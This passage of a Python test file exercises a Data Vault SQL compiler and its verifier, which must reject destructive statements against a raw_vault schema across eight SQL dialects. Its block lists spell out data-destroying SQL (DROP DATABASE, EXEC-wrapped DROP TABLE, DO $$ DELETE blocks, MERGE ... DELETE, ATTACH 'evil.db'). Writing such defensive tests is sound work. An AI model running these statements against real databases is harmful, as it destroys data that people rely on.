    assert "models/Z1_staging/stg_issuer_feed.sql" in dbt_bundle.files
    assert "OCTET_LENGTH" in dbt_bundle.files["models/Z1_staging/stg_issuer_feed.sql"]
    assert "src_hashdiff='hash_diff__sat_issuer_core'" in dbt_bundle.files["models/Z2_raw_vault/sat_issuer_core.sql"]
    assert "src_hashdiff='hash_diff__sat_issuer_pii'" in dbt_bundle.files["models/Z2_raw_vault/sat_issuer_pii.sql"]
    assert "src_hashdiff='hash_diff__mas_issuer_ballot'" in dbt_bundle.files["models/Z2_raw_vault/mas_issuer_ballot.sql"]

    long_dbt = DbtEmitter().emit(_build_enterprise_11type_ir(long_names=True), dbt_sql_dialect="postgres")
    long_sat = next(s for s in long_dbt.files if s.startswith("models/Z2_raw_vault/sat_issuer_core_"))
    hd_line = next(
        ln for ln in long_dbt.files["models/Z1_staging/stg_issuer_feed.sql"].splitlines()
        if "AS hash_diff__sat_issuer_core_" in ln
    )
    projected_hd = hd_line.rsplit(" AS ", 1)[1].rstrip(",").strip()
    assert f"src_hashdiff='{projected_hd}'" in long_dbt.files[long_sat]


def test_target_eval_gate_raises_emitter_verification_failed_exit_50(tmp_path: Path) -> None:
    """Injected AST, format, and runtime defects raise OpenDVError exit 50 + EmitterDefectReport."""
    ir = _build_enterprise_11type_ir()
    gate = TargetEvalGate()

    # 1. Injected exp.Command / Z2 DROP defect
    with pytest.raises(OpenDVError) as exc_ast:
        gate.verify_sql_ast("postgres", "DROP TABLE raw_vault.hub_issuer;", ir=ir)
    assert exc_ast.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
    assert exc_ast.value.exit_code == CliExitCode.EMITTER_VERIFICATION_FAILED == 50
    assert exc_ast.value.defect_report is not None
    assert exc_ast.value.defect_report.target_id == "postgres"

    # 2. Injected exp.Command syntax defect
    with pytest.raises(OpenDVError) as exc_cmd:
        gate.verify_sql_ast("duckdb_local", "ALTER TABLE raw_vault.sat_issuer_core MODIFY COLUMN seat_count BIGINT;")
    assert exc_cmd.value.exit_code == 50

    # 3. Injected Iceberg duplicate field_id defect (EVAL-FMT-01)
    bad_ice = tmp_path / "bad_ice"
    IcebergEmitter().emit(ir, output_dir=bad_ice)
    meta_p = bad_ice / "raw_vault/hub_issuer/metadata/v1.metadata.json"
    meta_json = json.loads(meta_p.read_text(encoding="utf-8"))
    meta_json["schemas"][0]["fields"][1]["id"] = meta_json["schemas"][0]["fields"][0]["id"]
    meta_p.write_text(json.dumps(meta_json), encoding="utf-8")
    with pytest.raises(OpenDVError) as exc_fmt:
        gate.verify_format_bundle("iceberg", bad_ice, ir)
    assert exc_fmt.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
    assert exc_fmt.value.exit_code == 50

    # 4. Injected runtime EVAL-RUN defect
    bad_ddl = "CREATE SCHEMA bronze; CREATE SCHEMA staging; CREATE SCHEMA raw_vault; CREATE SCHEMA business_vault; CREATE SCHEMA information_mart;"
    with pytest.raises(OpenDVError) as exc_run:
        gate.verify_duckdb_runtime(ir, bad_ddl, "")
    assert exc_run.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
    assert exc_run.value.exit_code == 50


def test_enterprise_11type_ir_verify_duckdb_runtime_mapped_esat_and_parity() -> None:
    """Execute full _build_enterprise_11type_ir() through TargetEvalGate.verify_duckdb_runtime + ESAT mapped DK."""
    ir = _build_enterprise_11type_ir()
    bundle = SqlGlotVaultCompiler("duckdb_local").compile(ir)
    rows = [
        {
            "issuer_cik": "0000320193",
            "account_id": "ACCT-01",
            "bkcc_src": "  ",
            "alias_cik": "0000320193-ALT",
            "proposal_seq": 1,
            "owner_email": "ir@apple.com",
            "trade_qty": 100,
            "steward_gate_status": "APPROVED",
            "issuer_name": "  Apple Inc\r\n",
            "seat_count": 8,
            "market_cap": 3000000000000,
            "nav_dec": Decimal("216.2800"),
            "founded_dt": date(1976, 4, 1),
            "updated_ts": datetime(2026, 10, 20, 18, 0, 0, tzinfo=UTC),
            "is_active": True,
            "meta_json": '{"sector": "tech"}',
            "tags_arr": None,
            "attrs_map": None,
            "nested_arr": None,
            "nested_map": None,
        },
        {
            "issuer_cik": "0000789019",
            "account_id": "ACCT-02",
            "bkcc_src": "SEC",
            "alias_cik": "0000789019-ALT",
            "proposal_seq": 2,
            "owner_email": "ir@msft.com",
            "trade_qty": 250,
            "steward_gate_status": "APPROVED",
            "issuer_name": "Nordisk Suverän Fond",
            "seat_count": 12,
            "market_cap": 2800000000000,
            "nav_dec": Decimal("412.5000"),
            "founded_dt": date(1975, 4, 4),
            "updated_ts": datetime(2026, 10, 21, 9, 30, 0, tzinfo=UTC),
            "is_active": False,
            "meta_json": '{"sector": "cloud"}',
            "tags_arr": None,
            "attrs_map": None,
            "nested_arr": None,
            "nested_map": None,
        },
    ]
    gate = TargetEvalGate()
    errs = gate.verify_duckdb_runtime(
        ir,
        bundle.ddl_sql,
        bundle.dml_sql,
        source_rows_by_table={"src_ibor:issuer_feed": rows},
    )
    assert errs == []

    # Also verify ESAT, PIT, and Z4 Mart populate cleanly with expected rows in DuckDB
    conn = duckdb.connect(":memory:")
    try:
        for s in bundle.ddl_statements:
            conn.execute(s)
        cols = [c.name for c in ir.bronze_tables[0].columns]
        conn.executemany(
            f"INSERT INTO bronze.bronze_issuer_feed ({', '.join(cols)}) "
            f"VALUES ({', '.join(['?'] * len(cols))})",
            [[r[c] for c in cols] for r in rows],
        )
        for s in bundle.dml_statements:
            conn.execute(s)
        esat_cnt = conn.execute("SELECT COUNT(*) FROM business_vault.esat_issuer_crosswalk").fetchone()
        pit_cnt = conn.execute(
            "SELECT COUNT(*), COUNT(DISTINCT hk_issuer) FROM business_vault.pit_issuer"
        ).fetchone()
        mart_rows = conn.execute(
            "SELECT issuer_cik, issuer_name FROM information_mart.vw_issuer_current ORDER BY issuer_cik"
        ).fetchall()
        assert esat_cnt and int(esat_cnt[0]) == 3  # 1 Ghost + 2 real crosswalk rows
        assert pit_cnt and int(pit_cnt[0]) >= 2 and int(pit_cnt[1]) == 2
        assert mart_rows == [("0000320193", "  Apple Inc\r\n"), ("0000789019", "Nordisk Suverän Fond")]
    finally:
        conn.close()


    # Verify DuckDbProverAdapter().prove() succeeds on _build_enterprise_11type_ir() with ArrayType/MapType + sal_issuer
    prover_rep = DuckDbProverAdapter().prove(ir, [])
    assert len(prover_rep.dyn_results) == 15
    assert all(prover_rep.dyn_results.values()), (
        {k: v for k, v in prover_rep.dyn_results.items() if not v},
        prover_rep.counterexamples,
    )
    assert prover_rep.ast_violations == []
    assert prover_rep.empirical_smells == []


def test_merge_when_matched_then_delete_and_tsql_if_block_blocked() -> None:
    """Block MERGE DELETE, CREATE OR REPLACE TABLE raw_vault.*, and T-SQL IfBlock nested DROP/MERGE."""
    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    for tid in SQL_TARGET_IDS:
        for cor_sql in (
            "CREATE OR REPLACE TABLE raw_vault.hub_issuer (hk_issuer VARCHAR)",
            "CREATE OR REPLACE TABLE raw_vault.hub_issuer AS SELECT 1 AS hk_issuer",
            "CREATE TABLE raw_vault.hub_evil AS VALUES ('a')",
            "CREATE TABLE raw_vault.sat_evil AS SELECT hk, COUNT(*) AS cnt FROM staging.s GROUP BY hk",
            "CREATE TABLE IF NOT EXISTS raw_vault.sat_evil AS SELECT hk, COUNT(*) AS cnt FROM staging.s GROUP BY hk",
            "SELECT 'a' AS hk INTO raw_vault.sat_evil FROM staging.s",
            "CREATE OR REPLACE VIEW raw_vault.vw_evil AS SELECT 1 AS a",
            "CREATE VIEW raw_vault.vw_evil AS SELECT 1 AS a",
            "INSERT OVERWRITE TABLE raw_vault.hub_issuer SELECT 1",
            "INSERT OVERWRITE INTO raw_vault.hub_issuer SELECT 1",
            "INSERT OR REPLACE INTO raw_vault.hub_issuer (hk, cik) VALUES ('a', '222')",
            "INSERT INTO raw_vault.hub_issuer (hk) SELECT hk FROM staging.s ON CONFLICT (hk) DO UPDATE SET cik = EXCLUDED.cik",
            "ALTER TABLE raw_vault.hub_issuer RENAME TO raw_vault.hub_evil",
            "ALTER TABLE raw_vault.hub_issuer RENAME COLUMN bkcc TO bkcc2",
        ):
            cor_diags = verifier.verify_sql(cor_sql, tid)
            assert any(d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER" for d in cor_diags), (
                tid,
                cor_sql,
            )
        assert verifier.verify_sql("CREATE TABLE IF NOT EXISTS raw_vault.hub_issuer (hk VARCHAR(64))", tid) == [], tid
        assert verifier.verify_sql("CREATE TABLE IF NOT EXISTS staging.stg_ok AS SELECT 1 AS hk", tid) == [], tid
        assert verifier.verify_sql("SELECT hk INTO staging.tmp FROM bronze.b", tid) == [], tid
        assert verifier.verify_sql("INSERT OR IGNORE INTO raw_vault.hub_issuer (hk, cik) VALUES ('a', '222')", tid) == [], tid
        assert verifier.verify_sql("INSERT INTO raw_vault.hub_issuer (hk) SELECT hk FROM staging.s ON CONFLICT (hk) DO NOTHING", tid) == [], tid
        assert verifier.verify_sql("INSERT INTO raw_vault.hub_issuer (hk) SELECT hk FROM staging.s ON CONFLICT DO NOTHING", tid) == [], tid
        assert verifier.verify_sql("CREATE OR REPLACE VIEW staging.stg_ok AS SELECT 1 AS a", tid) == [], tid
        assert verifier.verify_sql("CREATE OR REPLACE VIEW information_mart.vw_ok AS SELECT 1 AS a", tid) == [], tid

        m_del = (
            "MERGE INTO raw_vault.hub_issuer AS t USING staging.stg_issuer AS s "
            "ON t.hk_issuer = s.hk_issuer WHEN MATCHED THEN DELETE"
        )
        m_pred_del = (
            "MERGE INTO raw_vault.hub_issuer AS t USING staging.stg_issuer AS s "
            "ON t.hk_issuer = s.hk_issuer WHEN MATCHED AND s.flag = 1 THEN DELETE"
        )
        diags1 = verifier.verify_sql(m_del, tid)
        diags2 = verifier.verify_sql(m_pred_del, tid)
        assert any(d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER" for d in diags1), tid
        assert any(d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER" for d in diags2), tid

        m_ins = (
            "MERGE INTO raw_vault.hub_issuer AS t USING staging.stg_issuer AS s "
            "ON t.hk_issuer = s.hk_issuer WHEN NOT MATCHED THEN INSERT (hk_issuer) VALUES (s.hk_issuer)"
        )
        assert verifier.verify_sql(m_ins, tid) == [], tid

    for bad_rv_sql in (
        "CREATE OR REPLACE TABLE raw_vault.hub_issuer (hk_issuer VARCHAR)",
        "CREATE TABLE raw_vault.hub_evil AS VALUES ('a')",
        "CREATE TABLE IF NOT EXISTS raw_vault.sat_evil AS SELECT hk, COUNT(*) AS cnt FROM staging.s GROUP BY hk",
        "SELECT 'a' AS hk INTO raw_vault.sat_evil FROM staging.s",
        "CREATE OR REPLACE VIEW raw_vault.vw_evil AS SELECT 1 AS a",
        "INSERT OVERWRITE TABLE raw_vault.hub_issuer SELECT 1",
        "INSERT OR REPLACE INTO raw_vault.hub_issuer (hk, cik) VALUES ('a', '222')",
        "INSERT INTO raw_vault.hub_issuer (hk) SELECT hk FROM staging.s ON CONFLICT (hk) DO UPDATE SET cik = EXCLUDED.cik",
        "ALTER TABLE raw_vault.hub_issuer RENAME TO raw_vault.hub_evil",
    ):
        for tid in SQL_TARGET_IDS:
            with pytest.raises(OpenDVError) as exc_cor:
                gate.verify_sql_ast(tid, bad_rv_sql)
            assert exc_cor.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_cor.value.exit_code == 50

    with pytest.raises(OpenDVError) as exc:
        gate.verify_sql_ast(
            "duckdb_local",
            "MERGE INTO raw_vault.hub_issuer AS t USING staging.stg_issuer AS s "
            "ON t.hk_issuer = s.hk_issuer WHEN MATCHED THEN DELETE",
        )
    assert exc.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
    assert exc.value.exit_code == 50

    ir = _build_enterprise_11type_ir()
    tsql_bundle = SqlGlotVaultCompiler("sqlserver_fabric").compile(ir)
    tsql_drop = verifier.verify_sql(
        tsql_bundle.ddl_sql + "\nDROP TABLE raw_vault.hub_issuer;", "sqlserver_fabric", ir=ir
    )
    tsql_merge = verifier.verify_sql(
        tsql_bundle.ddl_sql
        + "\nMERGE INTO raw_vault.hub_issuer AS t USING s ON t.hk_issuer = s.hk_issuer "
        "WHEN MATCHED THEN UPDATE SET t.bkcc = 'X';",
        "sqlserver_fabric",
        ir=ir,
    )
    assert any(d.rule_id == "EVAL-AST-01" for d in tsql_drop)
    assert any(d.rule_id == "EVAL-AST-01" for d in tsql_merge)


def test_alg_a5_trailing_crlf_and_whitespace_bkcc_col_parity() -> None:
    """Verify trailing \\r\\n/\\t trim parity and whitespace bkcc_col fallback parity across DuckDB & ir_kernel."""
    sat_recipe = HashRecipeSpec(
        target_col="hash_diff",
        recipe_kind="SAT_HASH_DIFF",
        source_columns=["val"],
        sort_alphabetically=True,
    )
    hub_recipe = HashRecipeSpec(
        target_col="hk_ent",
        recipe_kind="HUB_HK",
        bkcc_literal="IBOR",
        bkcc_col="bkcc_src",
        source_columns=["val"],
        sort_alphabetically=False,
        key_columns=["val"],
    )
    conn = duckdb.connect(":memory:")
    try:
        for raw_val in ("  0000909100\r\n", "\t\nhello\r\n\t"):
            sat_sql = compile_hash_recipe_sql(
                sat_recipe, "duckdb", col_types={"val": "UTF8_STRING"}
            )
            got_sat = conn.execute(
                f"SELECT LOWER(HEX({sat_sql})) FROM (SELECT CAST(? AS VARCHAR) AS val)",
                [raw_val],
            ).fetchone()
            exp_sat = execute_hash_recipe(
                sat_recipe, {"val": raw_val}, column_types={"val": "UTF8_STRING"}
            )
            assert got_sat and got_sat[0] == exp_sat

            for tier in ("TIER_2_ENTERPRISE_SOR", "TIER_3_LOCAL_SCOPED"):
                hub_sql = compile_hash_recipe_sql(
                    hub_recipe,
                    "duckdb",
                    key_tier=tier,  # type: ignore[arg-type]
                    col_types={"val": "UTF8_STRING"},
                )
                got_hub = conn.execute(
                    f"SELECT LOWER(HEX({hub_sql})) FROM "
                    "(SELECT CAST(? AS VARCHAR) AS val, CAST('  ' AS VARCHAR) AS bkcc_src)",
                    [raw_val],
                ).fetchone()
                exp_hub = execute_hash_recipe(
                    hub_recipe,
                    {"val": raw_val, "bkcc_src": "  "},
                    key_tier=tier,  # type: ignore[arg-type]
                    column_types={"val": "UTF8_STRING"},
                )
                assert got_hub and got_hub[0] == exp_hub
    finally:
        conn.close()

    # Fail closed when TIER_3_LOCAL_SCOPED has empty bkcc_literal across all 8 dialects
    bad_recipe = HashRecipeSpec(
        target_col="hk_bad",
        recipe_kind="HUB_HK",
        bkcc_literal="",
        source_columns=["val"],
        sort_alphabetically=False,
        key_columns=["val"],
    )
    for tid in SQL_TARGET_IDS:
        d = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        with pytest.raises(ValueError, match="TIER_3_LOCAL_SCOPED"):
            compile_hash_recipe_sql(bad_recipe, d, key_tier="TIER_3_LOCAL_SCOPED")


def test_challenger_iter6_ast_bypasses_and_dollar_quotes_blocked_all_8_dialects() -> None:
    """Block alias UPDATE/DELETE, destructive ALTER, COPY/LOAD DATA, TokenError/$$, DROP DB/ATTACH/EXEC, Sat Subquery/Union."""
    verifier = SqlAstVerifier()
    gate = TargetEvalGate()

    must_block_eval = [
        "UPDATE h SET h.bkcc = 'X' FROM raw_vault.hub_issuer AS h",
        "UPDATE h SET bkcc = 'X' FROM staging.s JOIN raw_vault.hub_issuer AS h ON s.hk = h.hk",
        "DELETE FROM h USING raw_vault.hub_issuer AS h",
        "DELETE h FROM staging.s INNER JOIN raw_vault.hub_issuer AS h ON s.hk = h.hk",
        "ALTER TABLE raw_vault.hub_issuer SWAP WITH staging.stg_evil",
        "ALTER TABLE staging.stg_evil SWAP WITH raw_vault.hub_issuer",
        "ALTER TABLE raw_vault.hub_issuer REPLACE COLUMNS (hk STRING)",
        "ALTER TABLE raw_vault.hub_issuer DROP PARTITION (dt = '2026-01-01')",
        "ALTER TABLE staging.s RENAME TO raw_vault.hub_evil",
        "COPY raw_vault.hub_issuer FROM 'evil.csv'",
        "COPY INTO raw_vault.hub_issuer FROM '@stage/evil.csv'",
        "LOAD DATA INPATH '/tmp/evil.csv' OVERWRITE INTO TABLE raw_vault.hub_issuer",
        "LOAD DATA INPATH '/tmp/evil.csv' INTO TABLE raw_vault.hub_issuer",
        "SELECT 'unclosed",
        "DO $$ BEGIN DELETE FROM raw_vault.hub_issuer; END $$;",
        "DO $blk$ BEGIN DELETE FROM raw_vault.hub_issuer; END $blk$;",
        "DROP DATABASE raw_vault",
        "DROP DATABASE IF EXISTS raw_vault",
        "DROP SCHEMA raw_vault",
        "ATTACH 'evil.db' AS raw_vault",
        'ATTACH DATABASE \'evil.db\' AS "raw_vault"',
        "EXEC('DROP TABLE raw_vault.hub_issuer')",
        "EXECUTE ('DROP TABLE raw_vault.hub_issuer')",
        "EXECUTE IMMEDIATE 'DROP TABLE raw_vault.hub_issuer'",
        "EXEC sp_executesql N'DROP TABLE raw_vault.hub_issuer'",
    ]
    must_block_dv006 = [
        "INSERT INTO raw_vault.sat_issuer (SELECT hk, COUNT(*) FROM staging.s GROUP BY hk)",
        "INSERT INTO raw_vault.sat_issuer SELECT hk, COUNT(*) FROM staging.s GROUP BY hk UNION ALL SELECT hk, 1 FROM staging.s2",
    ]
    must_allow = [
        "UPDATE staging.s SET x = 1 FROM raw_vault.hub_issuer AS h WHERE s.hk = h.hk",
        "DELETE FROM staging.s USING raw_vault.hub_issuer AS h WHERE staging.s.hk = h.hk",
        "INSERT INTO raw_vault.sat_issuer (SELECT hk, val FROM staging.s)",
        "ALTER TABLE raw_vault.sat_issuer ADD COLUMN extra_col VARCHAR(64)",
    ]

    for tid in SQL_TARGET_IDS:
        for sql in must_block_eval:
            diags = verifier.verify_sql(sql, tid)
            assert any(d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER" for d in diags), (tid, sql, diags)
            with pytest.raises(OpenDVError) as exc:
                gate.verify_sql_ast(tid, sql)
            assert exc.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc.value.exit_code == 50
        for sql in must_block_dv006:
            diags = verifier.verify_sql(sql, tid)
            assert any(d.rule_id == "DV-AST-006" and d.severity == "BLOCKER" for d in diags), (tid, sql, diags)
            with pytest.raises(OpenDVError) as exc:
                gate.verify_sql_ast(tid, sql)
            assert exc.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        for sql in must_allow:
            assert verifier.verify_sql(sql, tid) == [], (tid, sql)


def test_eval_runtime_composite_timestamp_utc_us_array_and_map(tmp_path: Path) -> None:
    """Verify ArrayType/MapType(TIMESTAMP_UTC_US) pass DuckDbProverAdapter, TargetEvalGate, and materialize_duckdb_local."""
    cols = [
        IRField(field_id=1, name="item_id", logical_type="UTF8_STRING", nullable=False, is_pii=False),
        IRField(field_id=2, name="ts_arr", logical_type=ArrayType(element_type="TIMESTAMP_UTC_US"), nullable=True, is_pii=False),
        IRField(field_id=3, name="ts_map", logical_type=MapType(key_type="UTF8_STRING", value_type="TIMESTAMP_UTC_US"), nullable=True, is_pii=False),
    ]
    hk_r = HashRecipeSpec(
        target_col="hk_item", recipe_kind="HUB_HK", bkcc_literal="GLOBAL",
        source_columns=["item_id"], sort_alphabetically=False, key_columns=["item_id"],
    )
    hd_r = HashRecipeSpec(
        target_col="hash_diff", recipe_kind="SAT_HASH_DIFF",
        source_columns=["ts_arr", "ts_map"], sort_alphabetically=True, key_columns=["hk_item"],
    )
    ir = CertifiedVaultIR(
        project_id="tz_comp",
        ontology_version="1.0.0",
        wave_number=1,
        bronze_tables=[BronzeTableSpec(table_name="bronze_item", source_id="s1", source_table_id="s1:item", columns=cols)],
        staging_views=[
            StagingViewSpec(
                view_name="stg_item", source_id="s1", source_table_id="s1:item",
                col_lineage_mappings={c.name: c.name for c in cols},
                hash_recipes=[hk_r, hd_r], projected_fields=cols,
            )
        ],
        hubs=[
            CertifiedHubSpec(
                hub_name="hub_item", key_tier="TIER_1_GLOBAL_STANDARD",
                business_keys=[
                    BusinessKeyPart(
                        table_id="s1:item", col_name="item_id", source_id="s1",
                        key_tier="TIER_1_GLOBAL_STANDARD", bkcc_value="GLOBAL",
                    )
                ],
                source_bindings=[SourceBindingSpec(source_id="s1", table_id="s1:item", col_mappings={}, hash_recipe=hk_r)],
                columns=[
                    IRField(field_id=1, name="hk_item", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=2, name="bkcc", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                    IRField(field_id=3, name="load_dts", logical_type="TIMESTAMP_UTC_US", nullable=False, is_pii=False),
                    IRField(field_id=4, name="rec_src", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                    IRField(field_id=5, name="item_id", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                ],
                hash_recipe=hk_r, physical_hints=PhysicalLayoutHints(cluster_by_cols=["hk_item"]),
            )
        ],
        satellites=[
            CertifiedSatelliteSpec(
                sat_name="sat_item_core", sat_kind="STANDARD", parent_name="hub_item",
                source_id="s1", source_table_id="s1:item",
                attributes=[
                    DraftField(name="ts_arr", logical_type=ArrayType(element_type="TIMESTAMP_UTC_US"), nullable=True, is_pii=False),
                    DraftField(name="ts_map", logical_type=MapType(key_type="UTF8_STRING", value_type="TIMESTAMP_UTC_US"), nullable=True, is_pii=False),
                ],
                columns=[
                    IRField(field_id=1, name="hk_item", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=2, name="load_dts", logical_type="TIMESTAMP_UTC_US", nullable=False, is_pii=False),
                    IRField(field_id=3, name="rec_src", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                    IRField(field_id=4, name="hash_diff", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=5, name="ts_arr", logical_type=ArrayType(element_type="TIMESTAMP_UTC_US"), nullable=True, is_pii=False),
                    IRField(field_id=6, name="ts_map", logical_type=MapType(key_type="UTF8_STRING", value_type="TIMESTAMP_UTC_US"), nullable=True, is_pii=False),
                ],
                hash_recipe=hd_r, physical_hints=PhysicalLayoutHints(cluster_by_cols=["hk_item", "load_dts"]),
            )
        ],
    )

    rep = DuckDbProverAdapter().prove(ir, [])
    assert len(rep.dyn_results) == 15 and all(rep.dyn_results.values())
    assert rep.ast_violations == []

    bundle = SqlGlotVaultCompiler("duckdb_local").compile(ir)
    gate = TargetEvalGate()
    errs = gate.verify_duckdb_runtime(
        ir,
        bundle.ddl_sql,
        bundle.dml_sql,
        source_rows_by_table={"s1:item": [{"item_id": "A1", "ts_arr": None, "ts_map": None}]},
    )
    assert errs == []

    res = materialize_duckdb_local(ir, tmp_path / "tz_mat", metadata_only=True)
    assert res.verified is True


def test_challenger_iter7_ast_bypasses_and_cte_dml_blocked_all_8_dialects() -> None:
    """Block aliased DELETE FROM self, parenthesized FROM/USING/JOIN, CREATE OR REPLACE SCHEMA/DB, DETACH, and CTE DML."""
    verifier = SqlAstVerifier()
    gate = TargetEvalGate()

    must_block_all = [
        "DELETE h FROM raw_vault.hub_issuer AS h",
        "DELETE h FROM raw_vault.hub_issuer AS h WHERE h.bkcc = 'X'",
        "WITH cte AS (SELECT hk_issuer FROM raw_vault.hub_issuer) DELETE FROM cte",
        "WITH cte AS (SELECT hk_issuer FROM raw_vault.hub_issuer) UPDATE cte SET hk_issuer = 'x'",
        "UPDATE h SET bkcc = 'X' FROM (raw_vault.hub_issuer AS h)",
        "UPDATE h SET bkcc = 'X' FROM (raw_vault.hub_issuer) AS h",
        "DELETE FROM h USING (raw_vault.hub_issuer AS h)",
        "UPDATE h SET bkcc = 'X' FROM staging.s INNER JOIN (raw_vault.hub_issuer AS h) ON s.hk = h.hk",
        "CREATE OR REPLACE SCHEMA raw_vault",
        "CREATE OR REPLACE SCHEMA my_cat.raw_vault",
        "CREATE OR REPLACE DATABASE raw_vault",
    ]
    must_allow_all = [
        "DELETE s FROM staging.s INNER JOIN raw_vault.hub_issuer AS h ON s.hk = h.hk",
        "UPDATE staging.s SET x = 1 FROM raw_vault.hub_issuer AS h WHERE s.hk = h.hk",
        "WITH cte AS (SELECT hk_issuer FROM raw_vault.hub_issuer) DELETE FROM staging.s WHERE hk IN (SELECT hk_issuer FROM cte)",
        "CREATE OR REPLACE SCHEMA staging",
    ]

    for tid in SQL_TARGET_IDS:
        for sql in must_block_all:
            diags = verifier.verify_sql(sql, tid)
            assert any(d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER" for d in diags), (
                tid,
                sql,
                diags,
            )
            with pytest.raises(OpenDVError) as exc:
                gate.verify_sql_ast(tid, sql)
            assert exc.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc.value.exit_code == 50
        for sql in must_allow_all:
            assert verifier.verify_sql(sql, tid) == [], (tid, sql)

    for tid in ("duckdb_local", "clickhouse"):
        for detach_sql in ("DETACH DATABASE raw_vault", "DETACH raw_vault"):
            diags = verifier.verify_sql(detach_sql, tid)
            assert any(d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER" for d in diags), (
                tid,
                detach_sql,
                diags,
            )
            with pytest.raises(OpenDVError) as exc:
                gate.verify_sql_ast(tid, detach_sql)
            assert exc.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert verifier.verify_sql("DETACH DATABASE staging", tid) == [], tid

    ch_tbl = verifier.verify_sql("DETACH TABLE raw_vault.hub_issuer", "clickhouse")
    assert any(d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER" for d in ch_tbl), ch_tbl
    with pytest.raises(OpenDVError) as exc_ch:
        gate.verify_sql_ast("clickhouse", "DETACH TABLE raw_vault.hub_issuer")
    assert exc_ch.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED


def test_iter9_cte_alias_subquery_and_merge_ast_bypasses_blocked_all_8_dialects() -> None:
    """Block aliased/subquery updatable CTEs, parenthesized/inline-subquery DML, and CTE/parenthesized MERGE."""
    verifier = SqlAstVerifier()
    gate = TargetEvalGate()

    must_block_all = [
        # 1. Aliased updatable CTE DML (including chained CTEs)
        "WITH cte AS (SELECT hk_issuer FROM raw_vault.hub_issuer) UPDATE c SET bkcc = 'X' FROM cte AS c",
        "WITH cte AS (SELECT hk_issuer FROM raw_vault.hub_issuer) DELETE c FROM cte AS c",
        "WITH cte AS (SELECT hk_issuer FROM raw_vault.hub_issuer) DELETE FROM c USING cte AS c",
        "WITH c1 AS (SELECT hk_issuer FROM raw_vault.hub_issuer), c2 AS (SELECT hk_issuer FROM c1) UPDATE c SET bkcc = 'X' FROM c2 AS c",
        # 2. Subquery inside updatable CTE definition
        "WITH cte AS (SELECT hk_issuer FROM (SELECT hk_issuer FROM raw_vault.hub_issuer) AS sub) DELETE FROM cte",
        "WITH cte AS (SELECT hk_issuer FROM (SELECT hk_issuer FROM raw_vault.hub_issuer) AS sub) UPDATE cte SET bkcc = 'X'",
        # 3. Parenthesized / inline-subquery DELETE/UPDATE targets & CTE / parenthesized MERGE INTO
        "DELETE FROM (raw_vault.hub_issuer)",
        "DELETE FROM (raw_vault.hub_issuer AS h)",
        "DELETE FROM (raw_vault.hub_issuer) AS h",
        "UPDATE (raw_vault.hub_issuer) AS h SET bkcc = 'X'",
        "DELETE FROM (SELECT hk_issuer FROM raw_vault.hub_issuer) AS h",
        "DELETE FROM (SELECT hk_issuer FROM raw_vault.hub_issuer)",
        "UPDATE (SELECT hk_issuer, bkcc FROM raw_vault.hub_issuer) AS h SET bkcc = 'X'",
        "UPDATE (SELECT hk_issuer, bkcc FROM raw_vault.hub_issuer) h SET bkcc = 'X'",
        "WITH cte AS (SELECT hk_issuer FROM raw_vault.hub_issuer) MERGE INTO cte AS t USING staging.s AS s ON t.hk_issuer = s.hk WHEN MATCHED THEN DELETE",
        "WITH cte AS (SELECT hk_issuer FROM raw_vault.hub_issuer) MERGE INTO cte AS t USING staging.s AS s ON t.hk_issuer = s.hk WHEN MATCHED THEN UPDATE SET t.bkcc = 'X'",
        "MERGE INTO (raw_vault.hub_issuer) AS t USING staging.s AS s ON t.hk_issuer = s.hk WHEN MATCHED THEN DELETE",
        "MERGE INTO (raw_vault.hub_issuer) AS t USING staging.s AS s ON t.hk_issuer = s.hk WHEN MATCHED THEN UPDATE SET t.bkcc = 'X'",
    ]
    must_allow_all = [
        "WITH cte AS (SELECT hk_issuer FROM raw_vault.hub_issuer) DELETE s FROM staging.s AS s JOIN cte AS c ON s.hk = c.hk_issuer",
        "WITH cte AS (SELECT hk_issuer FROM raw_vault.hub_issuer) MERGE INTO staging.s AS t USING cte AS s ON t.hk = s.hk WHEN MATCHED THEN DELETE",
        "UPDATE staging.s SET x = 1 FROM (SELECT hk_issuer FROM raw_vault.hub_issuer) AS h",
        "DELETE FROM staging.s WHERE hk IN (SELECT hk_issuer FROM raw_vault.hub_issuer)",
        "WITH cte AS (SELECT id FROM staging.s WHERE hk IN (SELECT hk_issuer FROM raw_vault.hub_issuer)) DELETE FROM cte",
    ]

    for tid in SQL_TARGET_IDS:
        for sql in must_block_all:
            diags = verifier.verify_sql(sql, tid)
            assert any(d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER" for d in diags), (
                tid,
                sql,
                diags,
            )
            with pytest.raises(OpenDVError) as exc:
                gate.verify_sql_ast(tid, sql)
            assert exc.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc.value.exit_code == 50
        for sql in must_allow_all:
            assert verifier.verify_sql(sql, tid) == [], (tid, sql)


def test_iter10_ast_hardening_top_lateral_nested_subq_insert_partition_and_sha256(
    tmp_path: Path,
) -> None:
